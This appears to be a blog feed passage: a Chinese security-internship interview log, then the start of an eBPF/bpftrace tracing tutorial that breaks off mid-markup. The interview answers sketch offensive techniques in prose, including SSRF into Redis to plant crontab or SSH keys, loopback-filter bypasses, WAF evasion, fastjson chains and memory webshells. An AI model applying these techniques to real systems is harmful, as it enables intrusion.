    <content type="html"><![CDATA[<p>随手记录一下</p><span id="more"></span><h2 id="安恒卫兵实验室"><a href="#安恒卫兵实验室" class="headerlink" title="安恒卫兵实验室"></a>安恒卫兵实验室</h2><p>1、你的简历与你之前发过来的简历有什么变化吗？</p><p>2、说一说你研究过的东西，然后有什么产出</p><p>这里我说研究了 Weblogic、shiro，但是没产出，那边似乎比较失望。</p><p>3、最近出了 Weblogic 的一个新的洞，你有研究过吗？自己在研究的时候有没有思考过别人是怎么挖出来的洞。</p><p>人麻了，没复现漏洞过，然后也没思考过这个。。</p><p>4、你觉得挖什么样子的洞比较好呢？你一般是怎么开展研究的</p><p>我说看漏洞类型，但是无论如何你需要先去简单了解一下它的流程，如果一个组件的流程你不清楚，盲目的开始挖洞比较愚蠢，像盲人摸象。然后在了解过基础流程之后，如果是反序列化的洞，就用 codeql、tabby 这些东西去找漏洞。</p><p>不知道那边是什么想法，不过有一说一面我的时候感觉大部分时候都是吸气和叹气qaq</p><p>5、你学习安全是什么时候开始的呢，一路上的经历是怎么样的</p><p>就简单聊了聊</p><p>6、有没有什么让你感觉很自豪的项目</p><p>当时说了 golang 写 sqlmap</p><p>7、你是什么状况下去学习 golang 的呢？是出于什么考虑呢</p><p>似乎很多面试官都会问这个问题，还是和之前一样回答了一下。</p><p>8、为什么在连连只实习了一个月呢？都做了什么业务</p><p>xxx</p><p>9、能简单说说在连连做了什么渗透测试吗？</p><p>10、能说一说常见的 SQL 注入种类吗？自己有绕过过一些 SQL 注入的 waf 吗？</p><p>这里说了绕过安全狗，麻了，当时就想到很可能会问 HIDS 的相关内容，果不其然后面就问了</p><p>11、一般是怎么绕 waf 呢？具体说说</p><p>我说了先 fuzz，然后具体的 bypass 就根据可用字符来打，那边似乎很不满意</p><p>12、有遇到过语意型的 waf 吗？自己是怎么 bypass 的呢？</p><p>我这里真的有点麻，满脑子都是 HIDS 和阿里的产品，包括先知 ban waf</p><p>13、如果给到你一个1day，你要怎么样进行漏洞分析呢？</p><p>14、又问了我如果就是一个 SQL 注入的 1day，让你漏洞分析，你会怎么分析呢，比如是有些特定条件下的 SQL 注入，比如什么什么配置文件下，你会怎么分析呢？</p><p>15、那你这样分析流程不会很耗时间吗？如果ddl之前你还没有分析完漏洞呢？你会怎么办？</p><p>16、那如果还是分析不出来，你是不是要思考一下你的方法是不是有问题了</p><p>我: 嗯……应该是吧</p><p>17、那如果你的 1day 积累的很多都完不成呢</p><p>我说我可能会考虑问一下其他有过经验的师傅，多多取经。</p><p>我大致了解你的情况了，能说说 SSRF 怎么样才能最好的利用呢？</p><p>我说，SSRF 用的好的话是可以 rce 的，但是前提是你需要先探活。当然这里 rce 的方式有很多，比如配合文件上传 gopher 打。</p><p>18、那如果目前我们探活出来有个 redis 服务，你要怎么打呢</p><p>SSRF 打 redis 的本质就是仿 redis 命令，将其写入一些 shell。我答了最多的一般都是 crontab，还有写入 shell，就类似于文件包含的原理。其实还有写入 ssh 私钥。还有主从复制什么的。</p><p>19、能说一说 ssrf 的防御嘛</p><p>我说了加白，最常用的方法，后续又补充了说限制一些不必要的协议，像 gopher 这种完全没必要啊，还有就是不给回显，这样的话对方探活也探不出什么东西，可能就以为这里并不存在 ssrf，但还得是白名单牛逼</p><p>20、那如果在变量里面呢？你要怎么过滤</p><p>我感觉这里就是加个 filter，实现单一职责原则</p><p>21、那如果我这里限制了 127.0.0.1，限制了 127.0.0.2 ，那你要怎么 bypass 呢</p><p>我直接说了 dns rebinding，我说这种攻击非常可观。面试官问我还有没有其他的呢？我补充了 @ 符绕过，进制转换，句号替换.符号。</p><p>22、能展开讲讲 @ 符是这么绕过的吗</p><p>这里其实是和 url 协议是有关系的，因为我们本质的 url 协议是这样请求资源的<br>http∶&#x2F;&#x2F;url@ip，然后后面跟上请求的资源，比如 <a class="link" href="http://www.baidu.com@1.1.1.1,那么我们这里把后面/">http://www.baidu.com@1.1.1.1，那么我们这里把后面<i class="fas fa-external-link-alt"></i></a> @ 的内容修改成恶意的 127.0.0.1即可。</p><p>23、面试官又问，如果把这些各种符号都禁了呢，因为很多时候我们会过滤这些输入。</p><p>我说那就 dns rebinding 呗，面试官说 dns rebinding 的事儿到时候再说。然后答了进制转换，他说算一种，又答了 xip.io 与 xip.name<br>泛域名解析，无需配置，将自定义的任何域名解析到指定的 IP 地址。假设你的 IP 地址是 10.0.0.1，你只需使用 前缀域名+IP地址+xip.io 即可完成相应自定义域名解析。</p><p>24、关于内存马有了解嘛？可以简单讲讲有哪些内存马吗？</p><p>我说了我只搞了 Tomcat 型内存马，我知道还有 Agent 型内存马和 websocket 型，还有 upgrade 型内存马。</p><p>25、内存马的查杀了解过原理吗？</p><p>我麻了，我说看调用的所有的filters，看哪些 filters 是恶意的，是程序没有的</p><p>26、后面问了问实习薪资期望</p><blockquote><p>接下来就是反问环节</p></blockquote><h2 id="白帽汇安全研究面试"><a href="#白帽汇安全研究面试" class="headerlink" title="白帽汇安全研究面试"></a>白帽汇安全研究面试</h2><h3 id="一面"><a href="#一面" class="headerlink" title="一面"></a>一面</h3><p>1、自我介绍</p><p>2、讲一讲最近在做什么吧</p><p>3、说一说 Shiro 这个洞都了解多少</p><p>4、自己有没有独立挖出过 0day</p><p>5、weblogic 了解多少</p><p>说了一下复现了的漏洞，然后面试官让我说一说具体的一个漏洞</p><p>6、weblogic 的 T3 和 XMLDecoder 漏洞展开讲讲吧</p><p>7、fastjson 复现过多少漏洞，你研究的版本是多少</p><p>8、能简单说一说 Java 反序列化的流程吗？</p><p>9、讲讲 RMI 的通信原理以及为什么会存在漏洞</p><p>10、看到你还有在看 PHP 的东西，一般是研究哪种为主呢，PHP 还是 Java</p><p>11、说一说你做过的一些项目吧</p><p>12、写这个 Java 路线，你是出于什么考虑呢？</p><p>13、看到你审计过一些 CMS，自己从中有什么收获吗？</p><h3 id="二面"><a href="#二面" class="headerlink" title="二面"></a>二面</h3><p>二面主要是聊了聊一些挖洞的思想&#x2F;个人经历，很有聊天的感觉，个人忘记记录完全了。</p><h3 id="HR-面"><a href="#HR-面" class="headerlink" title="HR 面"></a>HR 面</h3><p>1、看到你的简历上写了有说网络安全协会，都做了协会哪些工作呢</p><p>2、预期薪资是多少呢，我说在北京差不多 330&#x2F;天吧</p><p>后面又说给实习生薪资一个月是 5500</p><p>3、有没有一段很难的时光</p><p>4、你是独生子女吗</p><p>5、最让你自豪的一件事是什么</p><p>6、在 CTF 上让你有很自豪的事情吗</p><p>7、有收到其他家的 offer 吗</p><p>8、目前多久能过来呢</p><h2 id="极氪安全研究"><a href="#极氪安全研究" class="headerlink" title="极氪安全研究"></a>极氪安全研究</h2><p>1、简单说一说你作为红队，在 hvv 期间会有怎样的视角</p><p>我说，这是不是就是 hvv 视角下的红队攻击。面试官说是的</p><p>然后就说了社工钓鱼、信息收集、外网打点、内网横移、还有就是通过信息泄露拿源码，再进行源码审计，再就是 0day、1day 的应用、恶意流量分析</p><p>2、听到你说了源码审计，简单说一下思路吧</p><p>就还是那一套 filter ——&gt; pom.xml ——&gt; 细的功能点 ——&gt; 调试</p><p>3、说一说如果 hvv 期间出了一个 fastjson 的 day，你需要怎么防护</p><p>给我特么问住了，面试官其实在这个过程中一直在向我往工具利用那方面引导。我说了加黑，然后加白这样的策略。</p><p>他又和我说，怎么样判断资产里面是否存在这个漏洞呢。我说用工具测，说如果你们有比较成熟的白盒扫描工具是可以的，但是我没用过。反正这个问题纠结了很久。。。。</p><p>4、说一说内网横移的思路吧</p><p>我说分 Windows 和 Linux，Linux 比较难横移；Windows 就还是那一套</p><p>5、说一说除了 web 服务之外还有服务值得注意</p><p>这个问题问的挺。。。隐晦</p><p>其实就是问有哪些端口，我就说了那些</p><p>6、说一说你用 python 做过的一些项目吧</p><p>简单聊了聊</p><p>7、有做过白盒代码审计的一些项目吗</p><p>没有</p><p>8、如果你挖掘 Java 反序列化的 0day，你会怎么挖掘呢</p><p>就还是那样</p><blockquote><p>下面是反问环节</p></blockquote><p>主要问了问他们的业务、转正、一般上班强度如何、部门地位如何、食堂</p><p>就这些</p><h2 id="墨云科技安全研究"><a href="#墨云科技安全研究" class="headerlink" title="墨云科技安全研究"></a>墨云科技安全研究</h2><p>总体上来说和白帽汇的面试很像，当时便没有记录，而且问的很急</p><h2 id="奇安信观星实验室"><a href="#奇安信观星实验室" class="headerlink" title="奇安信观星实验室"></a>奇安信观星实验室</h2><h3 id="一面-1"><a href="#一面-1" class="headerlink" title="一面"></a>一面</h3><p>1、先做个自我介绍吧</p><p>2、我看你有复现过一些 Java 反序列化的漏洞，简单讲一讲漏洞原理吧。</p><p>easy</p><p>3、在这些反序列化的链子里面，有什么比较共通的地方吗</p><p>我说了链首、链尾、sink 要求</p><p>4、你有审计 Java 代码的经验，可以简单说一说吗？</p><p>说了一些思路</p><p>5、我看你 CTF 打的很多，其中应该有很多 PHP 吧，然后你挖的 PHP 洞也挖了几个，简单讲讲让你印象深刻的洞吧。</p><p>说了一个 SQL 注入，一个 phar</p><p>6、我看你复现过 fastjson 系列的洞，说一说最新的那个 fastjson 1.2.80 的洞吧，就浅蓝挖的那个</p><p>日了。。。我没很好的复现过</p><p>7、那你说一说 fastjson 的一些漏洞原理和绕过思路吧</p><p>我说了一些，但是有一条通杀的 jdbc 没有很好的分析过，后悔。</p><p>8、PHP 反序列化的漏洞挖掘思路可以说一下吗？</p><p>这个不会</p><p>9、jpress 我看你有审计的校验，有自己搞出来一些前台 RCE 吗</p><p>无</p><p>10、简单聊一聊 Java 内存马吧，原理以及如何写入</p><p>后面就是反问环节，问了一下他们的业务，然后大概组织架构，转正情况</p><h3 id="二面-1"><a href="#二面-1" class="headerlink" title="二面"></a>二面</h3><p>说实话二面没有准备好，因为一些特殊原因</p><p>1、做个自我介绍吧，主要讲一讲自己研究哪个方向。</p><p>2、PHP 审计过哪些大型的 CMS 呢</p><p>我说了 TP，还有一些其他的自己审计的</p><p>3、TP 里面不是有个命令执行吗？可以说一说里面大概后利用是怎么利用的，比如现在目标站开启了 <code>disabled_function</code></p><p>我这里有点麻，本身 PHP 就不是很好，我说如果利用角度来说，蚁剑的插件就行，如果没有这个条件的话就手动写入 <code>.so</code> 文件</p><p>那你详细说一说怎么写进去…… 寄、我忘了具体利用手法</p><p>4、PHP 里面的 extract 变量覆盖这个问题，有在实际漏洞挖掘的时候遇到过吗</p><p>没有</p><p>5、面试官似乎还是很想问 PHP 的，问了 PHP 的另外一个问题，还是没怎么答出来。</p><p>又问了问 最近打的 CTF，主要是 ant 和 阿里云，让我讲讲印象深刻的题目，我都忘得差不多了。。</p><p>6、说一说 Java JDBC MySQL 反序列化这个漏洞吧</p><p>我说这只是给了一个入口，需要伪造 MySQL fake server</p><p>7、那你说一说怎么判断 MySQL jdbc 的版本吧</p><p>我说 wireshark 抓个包，内容应该会在里面</p><p>8、看你 Java CMS 审计过 jpress，当时是复现还是</p><p>我说了复现，然后让我聊一聊印象最深刻的一个洞</p><p>9、如果现在有个文件上传，但是只有 <code>Web-INF</code> 下的 <code>.jsp</code> 文件才会被渲染，你有什么思路</p><p>我说了 SSTI、crontab、sh、weblogic 的部署都可以</p><p>10、你有在大型攻防演练当中跟进过一些 VMware 类型的漏洞吗？展开聊聊</p><p>我说我只做过蓝队，然后 VMware 的话，最新的洞正在看。然后简单讲一讲，感觉面试官没有复现这个漏洞</p><p>11、听你说分析了 RocketMQ 的洞，简单聊聊吧</p><p>就简单聊了聊</p><p>12、那如果不出网呢？</p><p>。。。。我说这个单纯从这个漏洞的角度来说，其实是可以写入 crontab 的，但是实际打内存马，我还没有试过。</p><p>下面就是反问环节</p><h2 id="沥泉科技红队安全研究"><a href="#沥泉科技红队安全研究" class="headerlink" title="沥泉科技红队安全研究"></a>沥泉科技红队安全研究</h2><p>1、做个自我介绍吧</p><p>2、看你漏洞这块，Java，PHP，Python 都有了解是吗？简单说一说怎么审计 PHP 漏洞的吧。</p><p>说了用 Seay 扫一扫，然后对扫出来的重点去审计，黑白盒结合一起打</p><p>3、Seay 是很老的东西了，你有没有修改一下它的规则什么的</p><p>答：没有。。。寄</p><p>4、如果你没有修改过的话，那你怎么样才能挖出别人挖不出来的洞呢？</p><p>不会啊。。麻了</p><p>5、说一说了解的 Java 漏洞吧，像 fastjson、shiro 这些，就先说说 fastjson 吧，你对它了解多少。</p><p>这里我说了说 fastjson 最好用的两条链子，一条是 templatesImpl 的，另外一条是不出网的 BCEL。</p><p>6、简单说一说 fastjson 的 checkAutoType 吧</p><p>如果开启了就是先白名单过滤，再黑名单。</p><p>如果没开启就是会先黑名单，再白名单。</p><p>7、那关于 fastjson 的 parse 和 parseObject 呢？</p><p>parseObject：返回 fastjson.JSONObject 类</p><p>parse ：返回我们的类 User</p><p>一般来说 parseObject 的利用面更广</p><p>8、有学过哪些框架和组件呢？为什么要学他们</p><p>就简单说了说，不过我的回答好像让那边挺满意的</p><p>9、关于 Shiro 的漏洞，有了解吗？展开说说</p><p>说了 550，721 和权限绕过</p><p>10、说一说 721 的 Oracle Padding Attack 的原理</p><p>寄，没背过</p><p>11、你用 Python 写过什么工具吗</p><p>说了说自己写了爬虫，然后写了个网段扫描的工具。</p><p>12、说到 nmap，一般 nmap 扫描很慢的时候会怎么办呢？</p><p>这里应该是用 msscan 比较好</p><p>13、有了解过内网么？说一说 Kerberos 协议的流程吧，后面又问了 NTLM 协议的流程</p><p>寄</p><p>14、除了 NTLM Hash，还知道哪些 Hash 呢</p><p>寄</p><p>15、src 自己有在挖嘛，简单说一说信息收集的一些方法吧。</p><p>寄，后门 l3m0n 师傅说有十多种方法。。。</p><p>16、话说 fastjson 需要碰到高版本的 jdk8 的时候要怎么绕过呢</p><p>这个其实就是 jndi 打高版本 jdk 的思路</p><p>17、Java 设计模式了解多少呢</p><p>18、打 CTF 是跟着战队拿奖还是自己校队拿奖</p><p>19、内网渗透的流程都了解吗</p><p>20、我大致了解你的情况了，可以说一说你的规划预期吗</p><hr><p>接下来就是反问环节，主要是问了问他们到底是做什么业务的。</p><p>面我的是 l3m0n 师傅，很强</p><h2 id="总结一下"><a href="#总结一下" class="headerlink" title="总结一下"></a>总结一下</h2><p>投的太晚了，金三银四，我是四月底投的，差不多五月初的样子，这个非常不利。</p><p>自己能力上还是有非常多的不足。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;随手记录一下&lt;/p&gt;</summary>
    
    
    
    
    <category term="面经" scheme="https://drun1baby.github.io/tags/%E9%9D%A2%E7%BB%8F/"/>
    
  </entry>
  
  <entry>
    <title>eBPF 内核跟踪</title>
    <link href="https://drun1baby.github.io/2023/08/06/eBPF-%E5%86%85%E6%A0%B8%E8%B7%9F%E8%B8%AA/"/>
    <id>https://drun1baby.github.io/2023/08/06/eBPF-%E5%86%85%E6%A0%B8%E8%B7%9F%E8%B8%AA/</id>
    <published>2023-08-06T07:38:53.000Z</published>
    <updated>2023-08-09T08:35:46.003Z</updated>
    
    <content type="html"><![CDATA[<p>eBPF 内核跟踪，eBPF 学习（四）</p><span id="more"></span><h1 id="eBPF-内核跟踪"><a href="#eBPF-内核跟踪" class="headerlink" title="eBPF 内核跟踪"></a>eBPF 内核跟踪</h1><p>今天我们先来看看，怎样使用 eBPF 去跟踪内核的状态，特别是最简单的 bpftrace 的使用方法。在下一讲中，我还将介绍两种 eBPF 程序的进阶编程方法。</p><p>上一讲中提到过，跟踪类 eBPF 程序主要包含内核插桩（<code>BPF_PROG_TYPE_KPROBE</code>）、跟踪点（<code>BPF_PROG_TYPE_TRACEPOINT</code>）以及性能事件（<code>BPF_PROG_TYPE_PERF_EVENT</code>）等程序类型，而每类 eBPF 程序类型又可以挂载到不同的内核函数、内核跟踪点或性能事件上。当这些内核函数、内核跟踪点或性能事件被调用的时候，挂载到其上的 eBPF 程序就会自动执行。</p><p>那么，你可能想问了：当我不知道内核中都有哪些内核函数、内核跟踪点或性能事件的时候，可以在哪里查询到它们的列表呢？对于内核函数和内核跟踪点，在需要跟踪它们的传入参数和返回值的时候，又该如何查询这些数据结构的定义格式呢？别担心，接下来就跟我一起去探索下吧。</p><h2 id="bpftrace-查询跟踪点的几种方法"><a href="#bpftrace-查询跟踪点的几种方法" class="headerlink" title="bpftrace 查询跟踪点的几种方法"></a>bpftrace 查询跟踪点的几种方法</h2><blockquote><p>官方文档 <a class="link" href="https://github.com/iovisor/bpftrace/blob/master/docs/reference_guide.md">https://github.com/iovisor/bpftrace/blob/master/docs/reference_guide.md<i class="fas fa-external-link-alt"></i></a></p></blockquote><h3 id="利用调试信息查询跟踪点"><a href="#利用调试信息查询跟踪点" class="headerlink" title="利用调试信息查询跟踪点"></a>利用调试信息查询跟踪点</h3><p>实际上，作为一个软件系统，内核也经常会发生各种各样的问题，比如安全漏洞、逻辑错误、性能差，等等。因此，内核本身的调试与跟踪一直都是内核提供的核心功能之一。</p><p>比如，为了方便调试，内核把所有函数以及非栈变量的地址都抽取到了  <code>/proc/kallsyms</code>  中，这样调试器就可以根据地址找出对应的函数和变量名称。很显然，具有实际含义的名称要比 16 进制的地址易读得多。对内核插桩类的 eBPF 程序来说，它们要挂载的内核函数就可以从  <code>/proc/kallsyms</code>  这个文件中查到。</p><p>注意，内核函数是一个非稳定 API，在新版本中可能会发生变化，并且内核函数的数量也在不断增长中。以 v5.13.0 为例，总的内核符号表数量已经超过了 16 万：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> /proc/kallsyms | <span class="built_in">wc</span> -l</span><br><span class="line">165694</span><br></pre></td></tr></table></figure><p>不过需要提醒你的是，这些符号表不仅包含了内核函数，还包含了非栈数据变量。而且，并不是所有的内核函数都是可跟踪的，只有显式导出的内核函数才可以被 eBPF 进行动态跟踪。因而，通常我们并不直接从内核符号表查询可跟踪点，而是使用我接下来介绍的方法。</p><p>为了方便内核开发者获取所需的跟踪点信息，内核<a class="link" href="https://www.kernel.org/doc/html/latest/filesystems/debugfs.html">调试文件系统<i class="fas fa-external-link-alt"></i></a>还向用户空间提供了内核调试所需的基本信息，如内核符号列表、跟踪点、函数跟踪（ftrace）状态以及参数格式等。你可以在终端中执行  <code>sudo ls /sys/kernel/debug</code>  来查询内核调试文件系统的具体信息。比如，执行下面的命令，就可以查询  <code>execve</code>  系统调用的参数格式：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo <span class="built_in">cat</span> /sys/kernel/debug/tracing/events/syscalls/sys_enter_execve/format</span><br></pre></td></tr></table></figure><p>注意，eBPF 程序的执行也依赖于调试文件系统。如果你的系统没有自动挂载它，那么我推荐你把它加入到系统开机启动脚本里面，这样机器重启后 eBPF 程序也可以正常运行。</p><p>有了调试文件系统，你就可以从  <code>/sys/kernel/debug/tracing</code>  中找到所有内核预定义的跟踪点，进而可以在需要时把 eBPF 程序挂载到对应的跟踪点。</p><p>除了内核函数和跟踪点之外，性能事件又该如何查询呢？你可以使用 Linux 性能工具  perf  来查询性能事件的列表。如下面的命令所示，你可以不带参数查询所有的性能事件，也可以加入可选的事件类型参数进行过滤：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo perf list [hw|sw|cache|tracepoint|pmu|sdt|metric|metricgroup]</span><br></pre></td></tr></table></figure><h3 id="利用-bpftrace-查询跟踪点"><a href="#利用-bpftrace-查询跟踪点" class="headerlink" title="利用 bpftrace 查询跟踪点"></a>利用 bpftrace 查询跟踪点</h3><p>虽然你可以利用内核调试信息和 perf 工具查询内核函数、跟踪点以及性能事件的列表，但它们的位置比较分散，并且用这种方法也不容易查询内核函数的定义格式。所以，我再给你推荐一个更好用的 eBPF 工具  <a class="link" href="https://github.com/iovisor/bpftrace/blob/master/docs/reference_guide.md">bpftrace<i class="fas fa-external-link-alt"></i></a>。</p><p>bpftrace 在 eBPF 和 BCC 之上构建了一个简化的跟踪语言，通过简单的几行脚本，就可以实现复杂的跟踪功能。并且，多行的跟踪指令也可以放到脚本文件中执行（脚本后缀通常为  <code>.bt</code>）。</p><p>如下图（图片来自 bpftrace文档）所示，bpftrace 会把你开发的脚本借助 BCC 编译加载到内核中执行，再通过 BPF 映射获取执行的结果：</p><img src="/2023/08/06/eBPF-%E5%86%85%E6%A0%B8%E8%B7%9F%E8%B8%AA/bpfTraceResult.png" class><p>因此，在编写简单的 eBPF 程序，特别是编写的 eBPF 程序用于临时的调试和排错时，你可以考虑直接使用 bpftrace ，而不需要用 C 或 Python 去开发一个复杂的程序。</p><ul><li>安装 bpf</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install -y bpftrace</span><br></pre></td></tr></table></figure><p>安装好 bpftrace 之后，你就可以执行  <code>bpftrace -l</code>  来查询内核插桩和跟踪点了。比如你可以通过以下几种方式来查询：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查询所有内核插桩和跟踪点</span></span><br><span class="line">sudo bpftrace -l</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用通配符查询所有的系统调用跟踪点</span></span><br><span class="line">sudo bpftrace -l <span class="string">&#x27;tracepoint:syscalls:*&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用通配符查询所有名字包含&quot;execve&quot;的跟踪点</span></span><br><span class="line">sudo bpftrace -l <span class="string">&#x27;*execve*&#x27;</span></span><br></pre></td></tr></table></figure><p>对于跟踪点来说，你还可以加上  <code>-v</code>  参数查询函数的入口参数或返回值。而由于内核函数属于不稳定的 API，在 bpftrace 中只能通过  <code>arg0</code>、<code>arg1</code>  这样的参数来访问，具体的参数格式还需要参考内核源代码。</p><p>比如，下面就是一个查询系统调用  <code>execve</code>  入口参数（对应系统调用 <code>sys_enter_execve</code>）和返回值（对应系统调用 <code>sys_exit_execve</code>）的示例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查询execve入口参数格式</span></span><br><span class="line">$ sudo bpftrace -lv tracepoint:syscalls:sys_enter_execve</span><br><span class="line">tracepoint:syscalls:sys_enter_execve</span><br><span class="line">    int __syscall_nr</span><br><span class="line">    const char * filename</span><br><span class="line">    const char *const * argv</span><br><span class="line">    const char *const * envp</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询execve返回值格式</span></span><br><span class="line">$ sudo bpftrace -lv tracepoint:syscalls:sys_exit_execve</span><br><span class="line">tracepoint:syscalls:sys_exit_execve</span><br><span class="line">    int __syscall_nr</span><br><span class="line">    long ret</span><br></pre></td></tr></table></figure><p>所以，你既可以通过内核调试信息和 perf 来查询内核函数、跟踪点以及性能事件的列表，也可以使用 bpftrace 工具来查询。</p><p>在这两种方法中，我更推荐使用更简单的 bpftrace 进行查询。这是因为，我们通常只需要在开发环境查询这些列表，以便去准备 eBPF 程序的挂载点。也就是说，虽然 bpftrace 依赖 BCC 和 LLVM 开发工具，但开发环境本来就需要这些库和开发工具。综合来看，用 bpftrace 工具来查询的方法显然更简单快捷。</p><p>在开发 eBPF 程序之前，还需要在这些长长的函数列表中进行选择，确定你应该挂载到哪一个上。那么，具体该如何选择呢？接下来，就进入我们的案例环节，一起看看内核跟踪点的具体使用方法。</p><h3 id="如何利用内核跟踪点排查短时进程问题？"><a href="#如何利用内核跟踪点排查短时进程问题？" class="headerlink" title="如何利用内核跟踪点排查短时进程问题？"></a>如何利用内核跟踪点排查短时进程问题？</h3><p>在排查系统 CPU 使用率高的问题时，我想你很可能遇到过这样的困惑：明明通过  top  命令发现系统的 CPU 使用率（特别是用户 CPU 使用率）特别高，但通过  ps、pidstat  等工具都找不出 CPU 使用率高的进程。这是什么原因导致的呢？你可以先停下来思考一下，再继续下面的内容。</p><p>你想到可能的原因了吗？在我看来，一般情况下，这类问题很可能是以下两个原因导致的：</p><ul><li>第一，应用程序里面直接调用其他二进制程序，并且这些程序的运行时间很短，通过  top  工具不容易发现；</li><li>第二，应用程序自身在不停地崩溃重启中，且重启间隔较短，启动过程中资源的初始化导致了高 CPU 使用率。</li></ul><p>使用  <code>top</code>、<code>ps</code>  等性能工具很难发现这类短时进程，这是因为它们都只会按照给定的时间间隔采样，而不会实时采集到所有新创建的进程。那要如何才能采集到所有的短时进程呢？你肯定已经想到了，那就是<strong>利用 eBPF 的事件触发机制，跟踪内核每次新创建的进程</strong>，这样就可以揪出这些短时进程。</p><p>要跟踪内核新创建的进程，首先得找到要跟踪的内核函数或跟踪点。如果你了解过 Linux 编程中创建进程的过程，我想你已经知道了，创建一个新进程通常需要调用  <code>fork()</code>  和  <code>execve()</code>  这两个标准函数，它们的调用过程如下图所示：</p><img src="/2023/08/06/eBPF-%E5%86%85%E6%A0%B8%E8%B7%9F%E8%B8%AA/newProcess.png" class><p>因为我们要关心的主要是新创建进程的基本信息，而像进程名称和参数等信息都在  <code>execve()</code>  的参数里，所以我们就要找出  <code>execve()</code>  所对应的内核函数或跟踪点。</p><p>借助刚才提到的  <code>bpftrace</code>  工具，你可以执行下面的命令，查询所有包含  <code>execve</code>  关键字的跟踪点：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo bpftrace -l <span class="string">&#x27;*execve*&#x27;</span></span><br></pre></td></tr></table></figure><p>命令执行后，你会得到如下的输出内容：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">kprobe:__ia32_compat_sys_execve</span><br><span class="line">kprobe:__ia32_compat_sys_execveat</span><br><span class="line">kprobe:__ia32_sys_execve</span><br><span class="line">kprobe:__ia32_sys_execveat</span><br><span class="line">kprobe:__x32_compat_sys_execve</span><br><span class="line">kprobe:__x32_compat_sys_execveat</span><br><span class="line">kprobe:__x64_sys_execve</span><br><span class="line">kprobe:__x64_sys_execveat</span><br><span class="line">kprobe:audit_log_execve_info</span><br><span class="line">kprobe:bprm_execve</span><br><span class="line">kprobe:do_execveat_common.isra.0</span><br><span class="line">kprobe:kernel_execve</span><br><span class="line">tracepoint:syscalls:sys_enter_execve</span><br><span class="line">tracepoint:syscalls:sys_enter_execveat</span><br><span class="line">tracepoint:syscalls:sys_exit_execve</span><br><span class="line">tracepoint:syscalls:sys_exit_execveat</span><br></pre></td></tr></table></figure><p>从输出中，你可以发现这些函数可以分为内核插桩（kprobe）和跟踪点（tracepoint）两类。在上一小节中我曾提到，内核插桩属于不稳定接口，而跟踪点则是稳定接口。因而，<strong>在内核插桩和跟踪点两者都可用的情况下，应该选择更稳定的跟踪点，以保证 eBPF 程序的可移植性（即在不同版本的内核中都可以正常执行）</strong>。</p><p>排除掉  kprobe  类型之后，剩下的  <code>tracepoint:syscalls:sys_enter_execve</code>、<code>tracepoint:syscalls:sys_enter_execveat</code>、<code>tracepoint:syscalls:sys_exit_execve</code>  以及  <code>tracepoint:syscalls:sys_exit_execveat</code>  就是我们想要的 eBPF 跟踪点。其中，<code>sys_enter_</code>  和  <code>sys_exit_</code>  分别表示在系统调用的入口和出口执行。</p><p>只有跟踪点的列表还不够，因为我们还想知道具体启动的进程名称、命令行选项以及返回值，而这些也都可以通过 bpftrace 来查询。在命令行中执行下面的命令，即可查询：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查询sys_enter_execve入口参数</span></span><br><span class="line">$ sudo bpftrace -lv tracepoint:syscalls:sys_enter_execve</span><br><span class="line">tracepoint:syscalls:sys_enter_execve</span><br><span class="line">    int __syscall_nr</span><br><span class="line">    const char * filename</span><br><span class="line">    const char *const * argv</span><br><span class="line">    const char *const * envp</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询sys_exit_execve返回值</span></span><br><span class="line">$ sudo bpftrace -lv tracepoint:syscalls:sys_exit_execve</span><br><span class="line">tracepoint:syscalls:sys_exit_execve</span><br><span class="line">    int __syscall_nr</span><br><span class="line">    long ret</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询sys_enter_execveat入口参数</span></span><br><span class="line">$ sudo bpftrace -lv tracepoint:syscalls:sys_enter_execveat</span><br><span 